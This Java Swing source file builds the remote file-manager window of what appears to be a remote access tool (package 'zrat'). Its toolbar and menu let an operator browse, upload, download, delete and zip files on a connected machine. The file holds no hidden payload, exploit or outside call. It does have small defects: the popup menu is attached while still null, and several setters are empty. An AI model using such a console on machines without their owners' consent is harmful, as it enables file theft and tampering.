package com.zrat.client.ui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JMenuItem;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JToolBar;
import javax.swing.ListSelectionModel;
import javax.swing.SwingConstants;
import javax.swing.table.DefaultTableColumnModel;
import javax.swing.table.TableColumn;

import com.zrat.client.controller.FileService;
import com.zrat.client.ui.model.FileTableModel;
import com.zrat.client.ui.model.FileTransferTableModel;
import com.zrat.client.util.Utils;
import com.zrat.transfer.model.FileTransferModel;
import com.zrat.transfer.model.RemoteFile;

/**
 * This code was edited or generated using CloudGarden's Jigloo SWT/Swing GUI
 * Builder, which is free for non-commercial use. If Jigloo is being used
 * commercially (ie, by a corporation, company or business for any purpose
 * whatever) then you should purchase a license for each developer using Jigloo.
 * Please visit www.cloudgarden.com for details. Use of Jigloo implies
 * acceptance of these licensing terms. A COMMERCIAL LICENSE HAS NOT BEEN
 * PURCHASED FOR THIS MACHINE, SO JIGLOO OR THIS CODE CANNOT BE USED LEGALLY FOR
 * ANY CORPORATE OR COMMERCIAL PURPOSE.
 */
public class FileFrame extends javax.swing.JFrame implements MouseListener,
		ActionListener {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JTable fileTable;
	private FileTableModel fileTableModel;
	private JScrollPane jScrollPane;
	private JPopupMenu jPopupMenu;
	private JButton up;
	private JButton unzipFile;
	private JButton zipFile;
	private JButton createDic;
	private JButton download;
	private JButton upload;
	private JButton refresh;
	private JButton deleteFile;
	private JButton createFile;
	private JToolBar jToolBar;
	private FileService service;
	private JFileChooser fc;
	private JMenuItem copyItem;
	private JMenuItem cutItem;
	private JSplitPane jSplitPane;
	private JTable transferTable;
	private JScrollPane transferJScrollPane;
	private JMenuItem pastItem;
	private JMenuItem deleteItem;
	private String sourcePath;
	private String targetPath;
	private boolean isCopy;
	private FileTransferTableModel transferTableModel;
	

	public FileFrame(FileService service,String title) {
		super();
		this.setTitle(title);
		this.service = service;
		initGUI();
	}

	private void initGUI() {
		try {
			BorderLayout thisLayout = new BorderLayout();
			this.setLayout(thisLayout);
			this.setPreferredSize(new java.awt.Dimension(542, 535));
			this.setSize(542, 535);
			{
				jScrollPane = new JScrollPane();
				jScrollPane.setBounds(389, 99, 10, 10);

				{
					fileTableModel = new FileTableModel();
					fileTable = new JTable();
//					fileTable.setLayout(fileTableLayout);

					fileTable.setRowSelectionAllowed(true);
					fileTable.setColumnSelectionAllowed(false);
					fileTable.setShowVerticalLines(true);// 设置是否显示单元格间的分割线
					fileTable.setShowHorizontalLines(true);
					fileTable.setModel(fileTableModel);
					fileTable
							.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
					fileTable.setPreferredScrollableViewportSize(new Dimension(
							400, 310));
					DefaultTableColumnModel dcm = (DefaultTableColumnModel) fileTable
							.getColumnModel();
					dcm.getColumn(0).setMinWidth(20);
					dcm.getColumn(0).setMaxWidth(20);

					fileTable.addMouseListener(this);

				}
			}
			{
				jToolBar = new JToolBar();
				this.add(jToolBar, BorderLayout.NORTH);
				jToolBar.setPreferredSize(new java.awt.Dimension(561, 62));
				{
					createFile = new JButton(
							Utils.createImageIcon("icons/newfile_32.png"));
					jToolBar.add(createFile);
					createFile.setVerticalTextPosition(SwingConstants.BOTTOM);
					createFile.setHorizontalTextPosition(SwingConstants.CENTER);
					createFile.setText("\u65b0\u5efa\u6587\u4ef6");
					createFile.addActionListener(this);
				}
				{
					createDic = new JButton(
							Utils.createImageIcon("icons/newfloder_32.png"));
					jToolBar.add(createDic);
					createDic.setVerticalTextPosition(SwingConstants.BOTTOM);
					createDic.setHorizontalTextPosition(SwingConstants.CENTER);
					createDic.setText("\u65b0\u5efa\u6587\u4ef6\u5939");
					createDic.addActionListener(this);
				}
				{
					deleteFile = new JButton(
							Utils.createImageIcon("icons/delete_32.png"));
					jToolBar.add(deleteFile);
					deleteFile.setVerticalTextPosition(SwingConstants.BOTTOM);
					deleteFile.setHorizontalTextPosition(SwingConstants.CENTER);
					deleteFile.setText("\u5220\u9664\u6587\u4ef6");
					deleteFile.addActionListener(this);
				}
				{
					up = new JButton(Utils.createImageIcon("icons/up_32.png"));
					jToolBar.add(up);
					up.setVerticalTextPosition(SwingConstants.BOTTOM);
					up.setHorizontalTextPosition(SwingConstants.CENTER);
					up.setText("上级目录");
					up.addActionListener(this);
				}
				{
					refresh = new JButton(
							Utils.createImageIcon("icons/refresh_32.png"));
					jToolBar.add(refresh);
					refresh.setVerticalTextPosition(SwingConstants.BOTTOM);
					refresh.setHorizontalTextPosition(SwingConstants.CENTER);
					refresh.setText("\u5237\u65b0");
					refresh.addActionListener(this);
				}
				{
					upload = new JButton(Utils.createImageIcon("icons/upload_32.png"));
					jToolBar.add(upload);
					upload.setVerticalTextPosition(SwingConstants.BOTTOM);
					upload.setHorizontalTextPosition(SwingConstants.CENTER);
					upload.setText("\u4e0a\u4f20\u6587\u4ef6");
					upload.addActionListener(this);
				}
				{
					download = new JButton(
							Utils.createImageIcon("icons/download_32.png"));
					jToolBar.add(download);
					download.setVerticalTextPosition(SwingConstants.BOTTOM);
					download.setHorizontalTextPosition(SwingConstants.CENTER);
					download.setText("\u4e0b\u8f7d\u6587\u4ef6");
					download.addActionListener(this);
				}
				
				{
					zipFile = new JButton(Utils.createImageIcon("icons/zip_32.png"));
					jToolBar.add(zipFile);
					zipFile.setVerticalTextPosition(SwingConstants.BOTTOM);
					zipFile.setHorizontalTextPosition(SwingConstants.CENTER);
					zipFile.setText("压缩文件");
					zipFile.addActionListener(this);
				}
				{
					unzipFile = new JButton(
							Utils.createImageIcon("icons/unzip_32.png"));
					jToolBar.add(unzipFile);
					unzipFile.setVerticalTextPosition(SwingConstants.BOTTOM);
					unzipFile.setHorizontalTextPosition(SwingConstants.CENTER);
					unzipFile.setText("解压文件");
					unzipFile.addActionListener(this);
				}
			}
			{
				jSplitPane = new JSplitPane();
				getContentPane().add(jSplitPane, BorderLayout.WEST);
				jSplitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
				{
					jSplitPane.add(jScrollPane, JSplitPane.TOP);
					jScrollPane.setPreferredSize(new java.awt.Dimension(539, 318));
					{
						jScrollPane.setViewportView(fileTable);
						{
							setComponentPopupMenu(fileTable, jPopupMenu);
							{
								jPopupMenu = new JPopupMenu();
								
								copyItem = new JMenuItem("复制文件");
								jPopupMenu.add(copyItem);
								copyItem.addActionListener(this);
								
								cutItem = new JMenuItem("剪切文件");
								jPopupMenu.add(cutItem);
								cutItem.addActionListener(this);
								
								pastItem = new JMenuItem("粘贴文件");
								jPopupMenu.add(pastItem);
								pastItem.addActionListener(this);
								
								jPopupMenu.addSeparator();
								
								deleteItem = new JMenuItem("删除文件");
								jPopupMenu.add(deleteItem);
								deleteItem.addActionListener(this);
								
							}
						}
					}
				}
				{
					transferJScrollPane = new JScrollPane();
					jSplitPane.add(transferJScrollPane, JSplitPane.BOTTOM);
					transferJScrollPane.setPreferredSize(new java.awt.Dimension(539, 120));
					{
						transferTableModel = 
							new FileTransferTableModel();
						transferTable = new JTable();
						transferTable.setRowSelectionAllowed(true);
						transferTable.setColumnSelectionAllowed(false);
						transferTable.setShowVerticalLines(true);// 设置是否显示单元格间的分割线
						transferTable.setShowHorizontalLines(true);
						transferJScrollPane.setViewportView(transferTable);
						transferTable.setPreferredScrollableViewportSize(new Dimension(
								300, 200));
						transferTable.setModel(transferTableModel);
						DefaultTableColumnModel dcm = (DefaultTableColumnModel) transferTable
						.getColumnModel();
						dcm.getColumn(0).setMinWidth(0);
						dcm.getColumn(0).setMaxWidth(0);
						setProgressBarColumn(transferTable,dcm.getColumn(3));
						
						
					}
				}
			}
			fc = new JFileChooser();
			fc.setMultiSelectionEnabled(true);

			this.addWindowListener(new WindowAdapter() {
				public void windowClosing(WindowEvent evt) {
					dispose();
					Client.currentServer.setFileFrame(null);
				}
			});

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	
	public void setProgressBarColumn(JTable table,
            TableColumn sportColumn){
		TransferProgressCellRender renderer =
            new TransferProgressCellRender(1,100);
//		renderer.setToolTipText("Click for combo box");
		sportColumn.setCellRenderer(renderer);
	}


	public FileTableModel getFileTableModel() {
		return fileTableModel;
	}

	public void setFileTableModel(FileTableModel fileTableModel) {
		this.fileTableModel = fileTableModel;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.awt.event.MouseListener#mouseClicked(java.awt.event.MouseEvent)
	 */
	@Override
	public void mouseClicked(MouseEvent e) {

		if (e.getButton() == MouseEvent.BUTTON1) {// 单击鼠标左键
			if (e.getComponent() == fileTable)
				if (e.getClickCount() == 2 && fileTable.getSelectedRow() >= 0) {
					RemoteFile file = fileTableModel.getSelectFile(fileTable
							.getSelectedRow());
					if (!file.isFile()) {
						service.getFiles(file.getPath());
//						fileTableModel.setParentFile(file);
//						fileTableModel.setCurrentPath(file.getPath());
//						fileTable.updateUI();
					}
				}
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.awt.event.MouseListener#mouseEntered(java.awt.event.MouseEvent)
	 */
	@Override
	public void mouseEntered(MouseEvent e) {
		// TODO Auto-generated method stub

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.awt.event.MouseListener#mouseExited(java.awt.event.MouseEvent)
	 */
	@Override
	public void mouseExited(MouseEvent e) {
		// TODO Auto-generated method stub

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.awt.event.MouseListener#mousePressed(java.awt.event.MouseEvent)
	 */
	@Override
	public void mousePressed(MouseEvent e) {
		// TODO Auto-generated method stub

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * java.awt.event.MouseListener#mouseReleased(java.awt.event.MouseEvent)
	 */
	@Override
	public void mouseReleased(MouseEvent e) {
		// TODO Auto-generated method stub

	}


	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * java.awt.event.ActionListener#actionPerformed(java.awt.event.ActionEvent)
	 */
	@Override
	public void actionPerformed(ActionEvent e) {
		if (e.getSource() == up){
			if(fileTableModel.getParentFile() != null && fileTableModel.getParentFile().getPath() != null){
				service.getFiles(fileTableModel.getParentFile().getPath());
			}else{
				service.getRoots();
			}
		}else if (e.getSource() == deleteFile) {
			deleteFile();
		} else if (e.getSource() == refresh) {
			refresh();
		} else if (e.getSource() == upload) {
			int returnVal = fc.showOpenDialog(this);
			if (returnVal == JFileChooser.APPROVE_OPTION) {
				File[] files = fc.getSelectedFiles();
				for(File file: files){
					FileTransferModel fileModel = new FileTransferModel();
					fileModel.setId(file.getAbsolutePath());
					fileModel.setName(file.getName());
					fileModel.setType("U");
					fileModel.setStatus("开始上传");
					fileModel.setProgress(0);
					fileModel.setSpeed("0");
					fileModel.setSize(file.length());
				transferTableModel.addRow(fileModel);
			}
							service.uploadFile(files, fileTableModel.getCurrentPath());
//							return;
//						}else{
//							if(JOptionPane.showConfirmDialog(RatUIManager.getMainPanel(), "文件已经存在，是否需要覆盖？") != JOptionPane.OK_OPTION){
//								return;
//							}
//						}
						
//					}
//				}
//				service.uploadFile(files[0].getAbsolutePath(), fileTableModel.getCurrentPath(),files[0].getName(), 0L);
			}

		} else if (e.getSource() == download) {
				List<RemoteFile> remoteFiles = fileTableModel.getSelectFiles(
						fileTable.getSelectedRows());
				for(RemoteFile file: remoteFiles){
					FileTransferModel fileModel = new FileTransferModel();
					fileModel.setId(file.getId());
					fileModel.setName(file.getName());
					fileModel.setType("D");
					fileModel.setStatus("开始下载");
					fileModel.setProgress(10);
					fileModel.setSpeed("0");
					fileModel.setSize(file.getSize());
					transferTableModel.addRow(fileModel);
				}
				service.download(remoteFiles);
//			}
		} else if (e.getSource() == zipFile) {
			service.zipFile(fileTableModel.getSelectFile(
					fileTable.getSelectedRow()).getPath());
			//refresh();
		} else if (e.getSource() == unzipFile) {
			service.unZipFile(fileTableModel.getSelectFile(
					fileTable.getSelectedRow()).getPath());
			//refresh();
		} else if (e.getSource() == deleteItem) {

			deleteFile();

		} else if (e.getSource() == copyItem) {
			copyFile();
		} else if (e.getSource() == cutItem) {
			cutFile();
		} else if (e.getSource() == pastItem) {
			pastFile();
		}

	}

	public void refresh() {
//		service.getFiles(fileTableModel
//				.getCurrentPath());
		if(fileTableModel.getCurrentPath() != null && !"".equals(fileTableModel.getCurrentPath())){
			service.getFiles(fileTableModel.getCurrentPath());
		}else{
			service.getRoots();
		}
		
		
		//fileTableModel.setList(files);
	}

	public void refreshTable(List<RemoteFile> files){
//		if (files.size() > 2){
		List<RemoteFile> newFile = new  ArrayList<RemoteFile>();
//		for(RemoteFile file : files){
//			if(file!=null){
//				newFile.add(file);
//			}
//		}
		
		if(files != null){
//			if(fileTableModel.getList()!=null && fileTableModel.getList().size()>0){
				newFile.addAll(files.subList(1, files.size()));
//			}else{
//				newFile.addAll(files);
//			}
			fileTableModel.setList(newFile);
			fileTableModel.setParentFile(files.get(0).getParent());
			fileTableModel.setCurrentPath(files.get(0).getPath());
		}
		
//		}else{
//			fileTableModel.setList(files);
//		}
	}
	
	public void deleteFile() {
		service.deleteFile(fileTableModel.getSelectFiles(
				fileTable.getSelectedRows()));
		//refresh();
	}

	public void copyFile() {
		isCopy = true;
		sourcePath = fileTableModel.getSelectFile(fileTable.getSelectedRow())
				.getPath();
		
	}

	public void cutFile() {
		isCopy = false;
		sourcePath = fileTableModel.getSelectFile(fileTable.getSelectedRow())
				.getPath();
	}

	public void pastFile() {
		if (!"".equals(sourcePath)) {
			targetPath = fileTableModel.getCurrentPath();
			if (isCopy ){ 
				service.copyFile(sourcePath, targetPath);
			}else{
				service.cutFile(sourcePath, targetPath);
			}
			//refresh();
		}
	}

	public JTable getFileTable() {
		return fileTable;
	}

	public void setFileTable(JTable fileTable) {
	}

	/**
	 * Auto-generated method for setting the popup menu for a component
	 */
	private void setComponentPopupMenu(final java.awt.Component parent,
			final javax.swing.JPopupMenu menu) {
		parent.addMouseListener(new java.awt.event.MouseAdapter() {
			public void mousePressed(java.awt.event.MouseEvent e) {
				if (e.isPopupTrigger())
					menu.show(parent, e.getX(), e.getY());
			}

			public void mouseReleased(java.awt.event.MouseEvent e) {
				if (e.isPopupTrigger())
					menu.show(parent, e.getX(), e.getY());
			}
		});
	}

	public FileService getService() {
		return service;
	}

	public void setService(FileService service) {
		this.service = service;
	}
	
	public JScrollPane getjScrollPane() {
		return jScrollPane;
	}

	public void setjScrollPane(JScrollPane jScrollPane) {
	}

	public JPopupMenu getjPopupMenu() {
		return jPopupMenu;
	}

	public void setjPopupMenu(JPopupMenu jPopupMenu) {
	}

	public JToolBar getjToolBar() {
		return jToolBar;
	}

	public void setjToolBar(JToolBar jToolBar) {
		this.jToolBar = jToolBar;
	}

	public JTable getTransferTable() {
		return transferTable;
	}

	public void setTransferTable(JTable transferTable) {
		this.transferTable = transferTable;
	}

	public FileTransferTableModel getTransferTableModel() {
		return transferTableModel;
	}

	public void setTransferTableModel(FileTransferTableModel transferTableModel) {
		this.transferTableModel = transferTableModel;
	}

	
}
